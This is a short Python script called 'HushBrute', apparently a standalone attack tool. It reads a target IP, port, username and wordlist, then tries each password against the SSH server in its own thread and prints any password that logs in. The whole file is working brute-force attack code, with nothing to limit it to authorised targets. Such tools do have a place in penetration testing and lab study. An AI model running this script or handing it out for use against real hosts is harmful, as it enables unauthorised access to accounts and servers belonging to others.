import paramiko, sys, os, termcolor
import threading, time
import pyfiglet

stop_flag = 0

def ssh_connect(password):

    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port_num, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored('Found Password: ','white') , termcolor.colored(password,'yellow') , termcolor.colored(' for Username: ','white') , termcolor.colored(username,'yellow'))
        print('\n')
    except:
        pass
    
    ssh.close()

ascii_banner = pyfiglet.figlet_format("HushBrute" + "\n")
print(ascii_banner)

print('Enter the Target IP:')
host = input('')

print('Enter the Port: ')
port_num = int(input(''))

print('Enter the Username:')
username = input('')

print('Enter the Wordlist:')
input_file = input('')
print('\n')

if os.path.exists(input_file) == False:
    print('Incorrect File!')
    sys.exit(1)

print('-' * 70)
print('Bruteforcing Password for: ' + host + ' With Account: ' + username)
print('-' * 70)
print('\n')

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)


